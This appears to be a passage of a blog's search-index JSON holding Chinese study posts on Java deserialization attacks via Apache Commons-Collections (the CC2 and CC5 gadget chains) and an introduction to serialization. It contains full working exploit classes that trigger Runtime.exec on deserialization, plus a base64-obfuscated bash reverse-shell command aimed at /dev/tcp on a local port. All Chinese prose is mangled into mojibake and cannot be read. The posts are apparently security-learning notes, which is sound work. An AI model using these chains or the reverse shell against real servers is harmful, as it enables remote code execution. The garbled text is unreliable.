çš„è¿æ¥ååŠéƒ¨åˆ†åº”è¯¥æ”¹ä¸ºï¼š 12345678910InvokerTransformer&lt;Object, Object&gt; invokerTransformer = new InvokerTransformer&lt;&gt;(&quot;newTransformer&quot;, new Class[]{}, new Object[]{}); TransformingComparator transformingComparator = new TransformingComparator(new ConstantTransformer(1)); //transformingComparator.compare(1,2); PriorityQueue priorityQueue = new PriorityQueue&lt;&gt;(transformingComparator); priorityQueue.add(templates); //åªèƒ½åœ¨ç¬¬ä¸€ä¸ªputè¿™é‡Œ priorityQueue.add(2); setFieldValue(transformingComparator,&quot;transformer&quot;,invokerTransformer); è°ƒè¯•è·Ÿè¿›å»çœ‹ä¸€ä¸‹å°±æ¸…æ¥šäº† æœ€ç»ˆè°ƒç”¨ InvokerTransformer.transform(templates) EXPç¼–å†™12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455package org.example;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import org.apache.commons.collections4.comparators.TransformingComparator;import org.apache.commons.collections4.functors.ConstantTransformer;import org.apache.commons.collections4.functors.InvokerTransformer;import java.io.*;import java.lang.reflect.Field;import java.nio.file.Files;import java.nio.file.Paths;import java.util.PriorityQueue;public class CC2Test { public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException { TemplatesImpl templates = new TemplatesImpl(); setFieldValue(templates,&quot;_name&quot;,&quot;1vxyz&quot;); byte[] code = Files.readAllBytes(Paths.get(&quot;D:\\\\Java-IDEA\\\\java_workspace\\\\CC\\\\target\\\\classes\\\\org\\\\example\\\\evil.class&quot;)); byte[][] codes = {code}; setFieldValue(templates,&quot;_bytecodes&quot;,codes); setFieldValue(templates,&quot;_tfactory&quot;,new TransformerFactoryImpl()); InvokerTransformer&lt;Object, Object&gt; invokerTransformer = new InvokerTransformer&lt;&gt;(&quot;newTransformer&quot;, new Class[]{}, new Object[]{}); TransformingComparator transformingComparator = new TransformingComparator(new ConstantTransformer(1)); //transformingComparator.compare(1,2); PriorityQueue priorityQueue = new PriorityQueue&lt;&gt;(transformingComparator); priorityQueue.add(templates); priorityQueue.add(2); setFieldValue(transformingComparator,&quot;transformer&quot;,invokerTransformer); //serialize(priorityQueue); unserialize(&quot;sercc2.bin&quot;); } public static void setFieldValue(Object object,String field_name,Object filed_value) throws NoSuchFieldException, IllegalAccessException { Class clazz=object.getClass(); Field declaredField=clazz.getDeclaredField(field_name); declaredField.setAccessible(true); declaredField.set(object,filed_value); } public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;sercc2.bin&quot;)); oos.writeObject(obj); } public static Object unserialize(String filename) throws IOException, ClassNotFoundException { ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename)); return ois.readObject(); }} CC2 é“¾åŒºåˆ«ä¸å…¶ä»–é“¾å­ä¸€ç‚¹çš„åŒºåˆ«åœ¨äºæ²¡æœ‰ç”¨ Transformer æ•°ç»„ã€‚ç™½æ—¥æ¢¦ç»„é•¿è¯´ï¼šä¸ç”¨æ•°ç»„æ˜¯å› ä¸ºæ¯”å¦‚ shiro å½“ä¸­çš„æ¼æ´ï¼Œå®ƒä¼šé‡å†™å¾ˆå¤šåŠ¨æ€åŠ è½½æ•°ç»„çš„æ–¹æ³•ï¼Œè¿™å°±å¯èƒ½ä¼šå¯¼è‡´æˆ‘ä»¬çš„ EXP æ— æ³•é€šè¿‡æ•°ç»„å®ç° åé¢æˆ‘ä»¬å­¦åˆ°çš„æ—¶å€™å†ä½“ä¼šä½“ä¼š","link":"/2023/06/13/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collection%E7%AF%8705-CC2%E9%93%BE/"},{"title":"Javaååºåˆ—åŒ–Commons-Collectionç¯‡06-CC5é“¾","text":"&lt;1&gt; ç¯å¢ƒåˆ†æjdkï¼šjdk8u65CCï¼šCommons-Collections 3.2.1pom.xml æ·»åŠ  1234567&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;commons-collections&lt;/groupId&gt; &lt;artifactId&gt;commons-collections&lt;/artifactId&gt; &lt;version&gt;3.2.1&lt;/version&gt; &lt;/dependency&gt;&lt;/dependencies&gt; &lt;2&gt; CC5é“¾å­åˆ†æ123456789101112131415161718192021/* Gadget chain: ObjectInputStream.readObject() BadAttributeValueExpException.readObject() TiedMapEntry.toString() LazyMap.get() ChainedTransformer.transform() ConstantTransformer.transform() InvokerTransformer.transform() Method.invoke() Class.getMethod() InvokerTransformer.transform() Method.invoke() Runtime.getRuntime() InvokerTransformer.transform() Method.invoke() Runtime.exec() Requires: commons-collectionsThis only works in JDK 8u76 and WITHOUT a security manager */ CC5çš„é“¾ å’ŒCC1å·®ä¸å¤šï¼Œåªä¸è¿‡ è°ƒç”¨ LazyMap.get()ç”¨çš„æ˜¯ TiedMapEntry.toString()è§¦å‘çš„ æˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹ TiedMapEntry.toString() è¿™é‡Œä¼šè°ƒç”¨ getValue() è·Ÿè¿› çœ‹ä¸€ä¸‹ getValueå‡½æ•°å†…å®¹ è¿™é‡Œå¯ä»¥ è°ƒç”¨ LazyMap.get() å› æ­¤æˆ‘ä»¬ç»™TiedMapEntryçš„mapèµ‹å€¼LazyMap å³å¯ 1234567891011121314151617181920212223242526272829303132333435363738394041package org.example;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.keyvalue.TiedMapEntry;import org.apache.commons.collections.map.LazyMap;import javax.management.BadAttributeValueExpException;import java.io.*;import java.util.HashMap;import java.util.Map;public class CC5Test { public static void main(String[] args) { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class, Class[].class}, new Object[]{&quot;getRuntime&quot;, null}), new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer(&quot;exec&quot;,new Class[]{String.class},new Object[]{&quot;calc&quot;}) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMap&lt;Object,Object&gt; map = new HashMap&lt;&gt;(); Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map,chainedTransformer); TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,&quot;aaa&quot;); tiedMapEntry.toString(); } public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;sercc5.bin&quot;)); oos.writeObject(obj); } public static Object unserialize(String filename) throws IOException, ClassNotFoundException { ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename)); return ois.readObject(); }} æˆåŠŸå¼¹å‡ºäº†è®¡ç®—å™¨ æˆ‘ä»¬å†æ‰¾ä¸€æ‰¾è§¦å‘ç‚¹ï¼Œæ¥çœ‹çœ‹å“ªé‡Œçš„readObjectè°ƒç”¨äº† toStringã€‚ ç”±äºè°ƒç”¨ toString()çš„å®åœ¨å¤ªå¤šäº†ï¼Œè¿™é‡Œæˆ‘ä»¬ä¹‹é—´çœ‹ä½œè€…æ‰¾åˆ°çš„ BadAttributeValueExpException è¿™é‡Œæ³¨æ„ï¼Œç”±äºæ„é€ å‡½æ•°åœ¨æ„é€ æ—¶ä¼šç›´æ¥è°ƒç”¨ toString() å› æ­¤æˆ‘ä»¬åº”è¯¥å…ˆä¼ å…¥ä¸€ä¸ªéšä¾¿çš„ç±»å‹ï¼Œç„¶åé€šè¿‡åå°„ä¿®æ”¹ valå±æ€§ä¸º æˆ‘ä»¬æ„é€ çš„TiedMapEntryï¼Œè¿™æ ·çš„è¯ï¼Œååºåˆ—åŒ–æ—¶æ‰ä¼šè°ƒç”¨TiedMapEntry ç”Ÿæˆåºåˆ—åŒ–æ•°æ®æ—¶ä¸ä¼šè°ƒç”¨é“¾å­(ç›´æ¥å†™çš„è¯ååºåˆ—åŒ–ä¹Ÿä¼šå¯æ­£å¸¸è°ƒç”¨ï¼Œä¸è¿‡ä¸å¤ªå¥½ æˆ‘ä»¬ä¸éœ€è¦åœ¨ç”Ÿæˆæ—¶æœ¬åœ°æ‰§è¡Œä¸€æ¬¡æ¶æ„å‘½ä»¤) &lt;3&gt; EXPç¼–å†™123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051package org.example;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.keyvalue.TiedMapEntry;import org.apache.commons.collections.map.LazyMap;import javax.management.BadAttributeValueExpException;import java.io.*;import java.lang.reflect.Field;import java.util.HashMap;import java.util.Map;public class CC5Test { public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class, Class[].class}, new Object[]{&quot;getRuntime&quot;, null}), new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer(&quot;exec&quot;,new Class[]{String.class},new Object[]{&quot;calc&quot;}) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMap&lt;Object,Object&gt; map = new HashMap&lt;&gt;(); Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map,chainedTransformer); TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,&quot;aaa&quot;); //tiedMapEntry.toString(); BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(1); Class c = badAttributeValueExpException.getClass(); Field val = c.getDeclaredField(&quot;val&quot;); val.setAccessible(true); val.set(badAttributeValueExpException,tiedMapEntry); //serialize(badAttributeValueExpException); unserialize(&quot;sercc5.bin&quot;); } public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;sercc5.bin&quot;)); oos.writeObject(obj); } public static Object unserialize(String filename) throws IOException, ClassNotFoundException { ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename)); return ois.readObject(); }}","link":"/2023/06/13/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collection%E7%AF%8706-CC5%E9%93%BE/"},{"title":"Javaååºåˆ—åŒ–åˆæ¢+URLDNSé“¾","text":"æ‘˜è¦ï¼šä»€ä¹ˆæ˜¯javaååºåˆ—åŒ–&amp;URLDNSé“¾åˆ†æ &lt;1&gt; ä»€ä¹ˆæ˜¯åºåˆ—åŒ–/ååºåˆ—åŒ–åºåˆ—åŒ–ï¼Œå…¶å®å°±æ˜¯å°†æ•°æ®è½¬åŒ–æˆä¸€ç§å¯é€†çš„æ•°æ®ç»“æ„ï¼Œè‡ªç„¶ï¼Œå®ƒçš„é€†è¿‡ç¨‹å°±å«åšååºåˆ—åŒ–ã€‚ ç›®çš„ï¼š æ–¹ä¾¿æ•°æ®çš„ä¼ è¾“ä¸å­˜å‚¨ é€šå¸¸æˆ‘ä»¬åœ¨ç¼–ç¨‹çš„æ—¶å€™ï¼Œæˆ‘ä»¬éœ€è¦å°†æœ¬åœ°å·²ç»å®ä¾‹åŒ–çš„æŸä¸ªå¯¹è±¡ï¼Œé€šè¿‡ç½‘ç»œä¼ é€’åˆ°å…¶ä»–æœºå™¨å½“ä¸­ã€‚ä¸ºäº†æ»¡è¶³è¿™ç§éœ€æ±‚ï¼Œå°±æœ‰äº†æ‰€è°“çš„åºåˆ—åŒ–å’Œååºåˆ—åŒ– ä¸åŒäºphpåºåˆ—åŒ–å¯¹è±¡ O:4:&quot;test&quot;:2:{s:3:&quot;str&quot;;s:5:&quot;luoke&quot;;s:3:&quot;int&quot;;i:10;} æ˜¯ä¸€ä¸²æ•°æ®ï¼ŒJavaåºåˆ—åŒ–ä¹‹åæˆäº†äºŒè¿›åˆ¶æ–‡ä»¶ æ˜¯ å­—èŠ‚æµ (1) ä¸ºä»€ä¹ˆä¼šäº§ç”Ÿå®‰å…¨é—®é¢˜ï¼Ÿjavaååºåˆ—åŒ–æ¼æ´çš„å…³é”®å‡ºç°åœ¨ readObject ä¸Šï¼Œååºåˆ—åŒ–å¿…å®šæ‰§è¡ŒreadObjectæ–¹æ³•ï¼Œè€Œåœ¨æ‰§è¡Œjava.io.ObjectInputStream.readObject()ä¹‹å‰ï¼Œä¼šå…ˆå°è¯•æ‰§è¡Œ ååºåˆ—åŒ–çš„ç±»çš„ readObjectæ–¹æ³•ï¼Œå¦‚æœè¿™ä¸ªç±»é‡æ„äº†readObjectæ–¹æ³•ï¼Œé”™è¯¯çš„è°ƒç”¨äº†ä¸€äº›å±é™©æ–¹æ³•ï¼Œåˆ™ä¼šé€ æˆæ¼æ´ã€‚ åªè¦æœåŠ¡ç«¯ååºåˆ—åŒ–æ•°æ®,å®¢æˆ·ç«¯ä¼ é€’ç±»çš„readObjectä¸­ä»£ç ä¼šè‡ªåŠ¨æ‰§è¡Œ,ç»™äºˆæ”»å‡»è€…åœ¨æœåŠ¡å™¨ä¸Šè¿è¡Œä»£ç çš„èƒ½åŠ›. (2) å¯èƒ½çš„å½¢å¼ å…¥å£ç±»çš„readObjectç›´æ¥è°ƒç”¨å±é™©æ–¹æ³• å…¥å£ç±»å‚æ•°ä¸­åŒ…å«å¯æ§ç±»,è¯¥ç±»æœ‰å±é™©æ–¹æ³•,readObjectæ—¶è°ƒç”¨ å…¥å£ç±»å‚æ•°ä¸­åŒ…å«å¯æ§ç±»,è¯¥ç±»åˆè°ƒç”¨å…¶ä»–æœ‰å±é™©æ–¹æ³•çš„ç±»,readObjectæ—¶è°ƒç”¨ æ¯”å¦‚ç±»å‹å®šä¹‰ä¸º Object, è°ƒç”¨equals/hashcode/toString ç›¸åŒç±»å‹ åŒåå‡½æ•° æ„é€ å‡½æ•°/é™æ€ä»£ç å—ç­‰ç±»åŠ è½½æ—¶éšå¼æ‰§è¡Œ (3) Javaååºåˆ—åŒ–æ¼æ´åŸå› Javaä¸­é—´ä»¶é€šå¸¸é€šè¿‡ç½‘ç»œæ¥æ”¶å®¢æˆ·ç«¯å‘é€çš„åºåˆ—åŒ–æ•°æ®,è€Œåœ¨æœåŠ¡ç«¯å¯¹åºåˆ—åŒ–æ•°æ®è¿›è¡Œååºåˆ—åŒ–æ—¶,ä¼šè°ƒç”¨è¢«åºåˆ—åŒ–å¯¹è±¡çš„readObject()æ–¹æ³•.è€Œåœ¨Javaä¸­å¦‚æœé‡å†™äº†æŸä¸ªç±»çš„æ–¹æ³•,å°±ä¼šä¼˜å…ˆè°ƒç”¨ç»è¿‡ä¿®æ”¹åçš„æ–¹æ³•.å¦‚æœæŸä¸ªå¯¹è±¡é‡å†™äº†readObject()æ–¹æ³•,ä¸”åœ¨æ–¹æ³•ä¸­èƒ½å¤Ÿæ‰§è¡Œä»»æ„ä»£ç ,é‚£æœåŠ¡ç«¯åœ¨è¿›è¡Œååºåˆ—åŒ–æ—¶,ä¹Ÿä¼šæ‰§è¡Œç›¸åº”ä»£ç  &lt;2&gt; javaåºåˆ—åŒ–ä¸ååºåˆ—åŒ–(1) å‰ç½®åŸºç¡€çŸ¥è¯† éœ€è¦è·³å‡ºPHPååºåˆ—åŒ–çš„æ€æƒ³ï¼š åœ¨phpä¸­åºåˆ—åŒ–æ˜¯å°†å¯¹è±¡ç­‰è½¬æ¢æˆäº†å­—ç¬¦ä¸²,è€Œåœ¨Javaä¸­åˆ™æ˜¯è½¬æ¢æˆäº†å­—èŠ‚æµ åºåˆ—åŒ–/ååºåˆ—åŒ–æ˜¯ä¸€ç§æ€æƒ³,å¹¶ä¸å±€é™äºå…¶å®ç°çš„å½¢å¼ å¦‚: JAVAå†…ç½®çš„writeObject()/readObject() JAVAå†…ç½®çš„XMLDecoder()/XMLEncoder XStream SnakeYaml FastJson Jackson å‡ºç°è¿‡æ¼æ´çš„ç»„ä»¶ï¼š Apache Shiro Apache Axis Weblogic Jboss Fastjson Javaä¸­çš„å‘½ä»¤æ‰§è¡Œ 12345678910public static void main() throws Exception{ Runtime.getRuntime().exec(&quot;calc&quot;); /* Javaä¸­æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ä½¿ç”¨java.lang.Runtimeç±»çš„execæ–¹æ³• ä»¥ä¸Šå‡½æ•°å¯ä»¥å¼¹å‡ºè®¡ç®—å™¨ getRuntime()æ˜¯Runtimeç±»ä¸­çš„é™æ€æ–¹æ³•,ä½¿ç”¨æ­¤æ–¹æ³•è·å–å½“å‰javaç¨‹åºçš„Runtime(å³è¿è¡Œæ—¶:è®¡ç®—æœºç¨‹åºè¿è¡Œéœ€è¦çš„ä»£ç åº“,æ¡†æ¶,å¹³å°ç­‰) execåº•å±‚ä¸ºProcessBuilder:æ­¤ç±»ç”¨äºåˆ›å»ºæ“ä½œç³»ç»Ÿè¿›ç¨‹ æ¯ä¸ªProcessBuilderå®ä¾‹ç®¡ç†è¿›ç¨‹å±æ€§çš„é›†åˆã€‚start()æ–¹æ³•ä½¿ç”¨è¿™äº›å±æ€§åˆ›å»ºä¸€ä¸ªæ–°çš„Processå®ä¾‹ã€‚start()æ–¹æ³•å¯ä»¥ä»åŒä¸€å®ä¾‹é‡å¤è°ƒç”¨ï¼Œä»¥åˆ›å»ºå…·æœ‰ç›¸åŒæˆ–ç›¸å…³å±æ€§çš„æ–°å­è¿›ç¨‹ã€‚ */} æ³¨æ„:è¿™é‡Œçš„å‘½ä»¤æ‰§è¡Œ,å¹¶ä¸æ˜¯ä½¿ç”¨ç³»ç»Ÿä¸­çš„bashæˆ–æ˜¯cmdè¿›è¡Œçš„ç³»ç»Ÿå‘½ä»¤æ‰§è¡Œ,è€Œæ˜¯ä½¿ç”¨JAVAæœ¬èº«,æ‰€ä»¥åå¼¹shellçš„é‡å®šå‘ç¬¦åœ¨JAVAä¸­å¹¶ä¸æ”¯æŒ 1bash -c {echo,c2ggLWkgPiYgL2Rldi90Y3AvMTI3LjAuMC4xLzU1NTUgMD4mMQ==}|{base64,-d}{bash,-i} (2) ç¼–å†™ä¸€ä¸ªå¯ä»¥åºåˆ—åŒ–çš„ç±»åœ¨Javaå½“ä¸­,å¦‚æœä¸€ä¸ªç±»éœ€è¦è¢«åºåˆ—åŒ–å’Œååºåˆ—åŒ– ,éœ€è¦å®ç°java.io.Serializableæ¥å£ä¹Ÿå°±æ˜¯è®©ä»– implements Serializeable åŒæ—¶ï¼Œè¢«transientä¿®é¥°çš„å±æ€§ä¹Ÿä¸å‚ä¸åºåˆ—åŒ–è¿‡ç¨‹ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152package test;import java.io.IOException;import java.io.ObjectInputStream;import java.io.Serializable;public class Person implements Serializable { private static final long serialVersionUID = 1L; // æ·»åŠ ä¸€ä¸ª transient å…³é”®å­—,åˆ™nameå±æ€§ä¸ä¼šè¢«åºåˆ—åŒ–å’Œååºåˆ—åŒ– // å¦‚æœå°†å±æ€§è®¾ç½®ä¸ºstatic,åŒæ ·ä¸ä¼šè¢«åºåˆ—åŒ–å’Œååºåˆ—åŒ– // private transient String name; public String name; private int age; public Person(){ } public Person(String name, int age) { this.name = name; this.age = age; } /* * @Overrideæ˜¯Java5çš„å…ƒæ•°æ®,è‡ªåŠ¨åŠ ä¸Šå»çš„ä¸€ä¸ªæ ‡å¿—,å‘Šè¯‰ä½ è¯´ä¸‹é¢è¿™ä¸ªæ–¹æ³•æ˜¯ä»çˆ¶ç±»/æ¥å£ * ç»§æ‰¿è¿‡æ¥çš„,éœ€è¦ä½ é‡å†™ä¸€æ¬¡,è¿™æ ·å°±å¯ä»¥æ–¹ä¾¿ä½ é˜…è¯»,ä¹Ÿä¸æ€•ä¼šå¿˜è®° * @Overrideæ˜¯ä¼ªä»£ç ,è¡¨ç¤ºé‡å†™(å½“ç„¶ä¸å†™ä¹Ÿå¯ä»¥),ä¸è¿‡å†™ä¸Šæœ‰å¦‚ä¸‹å¥½å¤„: * 1. å¯ä»¥å½“æ³¨é‡Šç”¨,æ–¹ä¾¿é˜…è¯» * 2. ç¼–è¯‘å™¨å¯ä»¥ç»™ä½ éªŒè¯@Overrideä¸‹é¢çš„æ–¹æ³•åæ˜¯å¦æ˜¯ä½ çˆ¶ç±»ä¸­æ‰€æœ‰çš„,å¦‚æœæ²¡æœ‰åˆ™æŠ¥é”™ * æ¯”å¦‚ä½ å¦‚æœæ²¡å†™@Overrideè€Œä½ ä¸‹é¢çš„æ–¹æ³•ååˆå†™é”™äº†,è¿™æ—¶ä½ çš„ç¼–è¯‘å™¨æ˜¯å¯ä»¥é€šè¿‡çš„(å®ƒä»¥ä¸ºè¿™ä¸ªæ–¹æ³•æ˜¯ä½ çš„å­ç±»ä¸­è‡ªå·±å¢åŠ çš„æ–¹æ³•) * ä½¿ç”¨è¯¥æ ‡è®°æ˜¯ä¸ºäº†å¢å¼ºç¨‹åºåœ¨ç¼–è¯‘æ—¶å€™çš„æ£€æŸ¥,å¦‚æœè¯¥æ–¹æ³•å¹¶ä¸æ˜¯ä¸€ä¸ªè¦†ç›–çˆ¶ç±»çš„æ–¹æ³•,åœ¨ç¼–è¯‘æ—¶ç¼–è¯‘å™¨å°±ä¼šæŠ¥å‘Šé”™è¯¯ */ @Override public String toString() { return &quot;Person{&quot; + &quot;name='&quot; + name + '\\'' + &quot;,age=&quot; + age + '}'; } private void readObject(ObjectInputStream objectInputStream) throws IOException, ClassNotFoundException, IOException { /* * java.io.ObjectInputStream.defaultReadObject() * æ–¹æ³•ç”¨äºä»è¿™ä¸ªObjectInputStreamè¯»å–å½“å‰ç±»çš„éé™æ€å’Œéç¬æ€å­—æ®µ.å®ƒé—´æ¥åœ°æ¶‰åŠåˆ°è¯¥ç±»çš„readObject()æ–¹æ³•çš„å¸®åŠ©. * å¦‚æœå®ƒè¢«è°ƒç”¨,åˆ™ä¼šæŠ›å‡ºNotActiveException */ objectInputStream.defaultReadObject(); /* * æ¯ä¸ªJavaåº”ç”¨ç¨‹åºéƒ½æœ‰ä¸€ä¸ªRuntimeç±»çš„Runtime ,å…è®¸åº”ç”¨ç¨‹åºä¸è¿è¡Œåº”ç”¨ç¨‹åºçš„ç¯å¢ƒè¿›è¡Œæ¥å£.å½“å‰è¿è¡Œæ—¶å¯ä»¥ä»getRuntimeæ–¹æ³•è·å¾—. */ /* * exec:åœ¨å…·æœ‰æŒ‡å®šç¯å¢ƒçš„å•ç‹¬è¿›ç¨‹ä¸­æ‰§è¡ŒæŒ‡å®šçš„å­—ç¬¦ä¸²å‘½ä»¤. * è¿™æ˜¯ä¸€ç§æ–¹ä¾¿çš„æ–¹æ³•. è°ƒç”¨è¡¨å•exec(command, envp)çš„è¡Œä¸ºæ–¹å¼ä¸è°ƒç”¨exec(command, envp, null)å®Œå…¨ç›¸åŒ . */ Runtime.getRuntime().exec(&quot;calc&quot;); }} IDEAé‡Œæ”¯æŒ Alt+insert å¯¼å…¥ç›¸åº”çš„åŒ… Ctrl+click è·Ÿè¿›java.io.Serializableæ¥å£ 12public interface Serializable {} å‘ç°æ˜¯ä¸€ä¸ªç©ºæ¥å£,è¯´æ˜å…¶ä½œç”¨åªæ˜¯ä¸ºäº†åœ¨åºåˆ—åŒ–å’Œååºåˆ—åŒ–ä¸­åšäº†ä¸€ä¸ªç±»å‹åˆ¤æ–­.ä¸ºä»€ä¹ˆå‘¢?å› ä¸ºéœ€è¦éµå¾ªéå¿…è¦åŸåˆ™,ä¸éœ€è¦ååºåˆ—åŒ–çš„ç±»å°±å¯ä»¥ä¸ç”¨åºåˆ—åŒ–äº† (3) å¦‚ä½•åºåˆ—åŒ–ç±»JavaåŸç”Ÿå®ç°äº†ä¸€å¥—åºåˆ—åŒ–çš„æœºåˆ¶,å®ƒè®©æˆ‘ä»¬ä¸éœ€è¦é¢å¤–ç¼–å†™ä»£ç ,åªéœ€è¦å®ç°java.io.Serializableæ¥å£,å¹¶è°ƒç”¨ObjectOutputStreamç±»çš„writeObjectæ–¹æ³•å³å¯ 12345678910111213141516171819202122232425262728293031package test;import java.io.FileOutputStream;import java.io.IOException;import java.io.ObjectOutputStream;public class serialize { public static void main(String[] args) throws IOException { //ç”ŸæˆPersonå¯¹è±¡çš„å®ä¾‹ Person person = new Person(&quot;1vxyz&quot;, 18); /* * ObjectOutputStreamå°†Javaå¯¹è±¡çš„åŸå§‹æ•°æ®ç±»å‹å’Œå›¾å½¢å†™å…¥OutputStream.å¯ä»¥ä½¿ç”¨ObjectInputStreamè¯»å–ï¼ˆé‡æ„ï¼‰ * å¯¹è±¡.å¯ä»¥é€šè¿‡ä½¿ç”¨æµçš„æ–‡ä»¶æ¥å®ç°å¯¹è±¡çš„æŒä¹…å­˜å‚¨.å¦‚æœæµæ˜¯ç½‘ç»œå¥—æ¥å­—æµ,åˆ™å¯ä»¥åœ¨å¦ä¸€ä¸ªä¸»æœºä¸Šæˆ–å¦ä¸€ä¸ªè¿›ç¨‹ä¸­é‡æ„å¯¹è±¡. */ /* * æ–‡ä»¶è¾“å‡ºæµæ˜¯ç”¨äºå°†æ•°æ®å†™å…¥åˆ°è¾“å‡ºæµFileæˆ–ä¸€ä¸ªFileDescriptor * .æ–‡ä»¶æ˜¯å¦å¯ç”¨æˆ–å¯èƒ½è¢«åˆ›å»ºå–å†³äºåº•å±‚å¹³å°.ç‰¹åˆ«æ˜¯æŸäº›å¹³å°å…è®¸ä¸€æ¬¡åªèƒ½æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶æ¥å†™å…¥ä¸€ä¸ªFileOutputStream * ï¼ˆæˆ–å…¶ä»–æ–‡ä»¶å†™å…¥å¯¹è±¡ï¼‰.åœ¨è¿™ç§æƒ…å†µä¸‹,å¦‚æœæ‰€æ¶‰åŠçš„æ–‡ä»¶å·²ç»æ‰“å¼€,åˆ™æ­¤ç±»ä¸­çš„æ„é€ å‡½æ•°å°†å¤±è´¥. * FileOutputStreamç”¨äºå†™å…¥è¯¸å¦‚å›¾åƒæ•°æ®çš„åŸå§‹å­—èŠ‚æµ. å¯¹äºå†™å…¥å­—ç¬¦æµ,è¯·è€ƒè™‘ä½¿ç”¨FileWriter . */ // åºåˆ—åŒ–çš„ç±» ObjectOutputStream obj = new ObjectOutputStream(new FileOutputStream(&quot;ser.ser&quot;)); /* * æ–¹æ³•writeObjectç”¨äºå°†ä¸€ä¸ªå¯¹è±¡å†™å…¥æµä¸­. ä»»ä½•å¯¹è±¡,åŒ…æ‹¬å­—ç¬¦ä¸²å’Œæ•°ç»„,éƒ½æ˜¯ç”¨writeObjectç¼–å†™çš„. å¤šä¸ªå¯¹è±¡æˆ–åŸè¯­å¯ä»¥å†™å…¥æµ. * å¿…é¡»ä»å¯¹åº”çš„ObjectInputstreamè¯»å–å¯¹è±¡,å…¶ç±»å‹å’Œå†™å…¥æ¬¡åºç›¸åŒ. */ // éœ€è¦åºåˆ—åŒ–çš„å¯¹è±¡æ˜¯è°? obj.writeObject(person); obj.close(); }} è·Ÿè¿›writeObjectå‡½æ•°,æˆ‘ä»¬é€šè¿‡é˜…è¯»ä»–çš„æ³¨é‡Šå¯çŸ¥: åœ¨ååºåˆ—åŒ–çš„è¿‡ç¨‹å½“ä¸­,æ˜¯é’ˆå¯¹å¯¹è±¡æœ¬èº«,è€Œéé’ˆå¯¹ç±»çš„,å› ä¸ºé™æ€å±æ€§æ˜¯ä¸å‚ä¸åºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„è¿‡ç¨‹çš„.å¦å¤–,å¦‚æœå±æ€§æœ¬èº«å£°æ˜äº†transientå…³é”®å­—,ä¹Ÿä¼šè¢«å¿½ç•¥.ä½†æ˜¯å¦‚æœæŸå¯¹è±¡ç»§æ‰¿äº†Aç±»,é‚£ä¹ˆAç±»å½“ä¸­çš„å¯¹è±¡çš„å¯¹è±¡å±æ€§ä¹Ÿæ˜¯ä¼šè¢«åºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„(å‰ææ˜¯Aç±»ä¹Ÿå®ç°äº†java.io.Serializableæ¥å£) (4) å¦‚ä½•ååºåˆ—åŒ–ç±»åºåˆ—åŒ–ä½¿ç”¨ObjectOutPutStreamç±»,ååºåˆ—åŒ–ä½¿ç”¨çš„åˆ™æ˜¯ObjectInputStreamç±»çš„readObjectæ–¹æ³•. ç”±äºæˆ‘ä»¬åœ¨ä¹‹å‰åœ¨Personç±»ä¸­é‡å†™äº†readObjectæ–¹æ³•ï¼Œæ‰€ä»¥ä¼šè°ƒç”¨java.lang.Runtimeç±»çš„execæ–¹æ³•æ‰§è¡Œcalcå‘½ä»¤ 1234private void readObject(ObjectInputStream objectInputStream) throws IOException, ClassNotFoundException, IOException { objectInputStream.defaultReadObject(); Runtime.getRuntime().exec(&quot;calc&quot;); } 12345678910111213141516171819202122232425262728package test;import java.io.FileInputStream;import java.io.IOException;import java.io.ObjectInputStream;public class unserialize { public static void main(String[] args) throws IOException, ClassNotFoundException { /* * ObjectInputStreamååºåˆ—åŒ–å…ˆå‰ä½¿ç”¨ObjectOutputStreamç¼–å†™çš„åŸå§‹æ•°æ®å’Œå¯¹è±¡. * ObjectOutputStreamå’ŒObjectInputStreamå¯ä»¥åˆ†åˆ«ä¸ºä¸FileOutputStreamå’ŒFileInputStreamä¸€èµ·ä½¿ç”¨çš„å¯¹è±¡å›¾æä¾›æŒä¹…æ€§å­˜å‚¨çš„åº”ç”¨ç¨‹åº. * 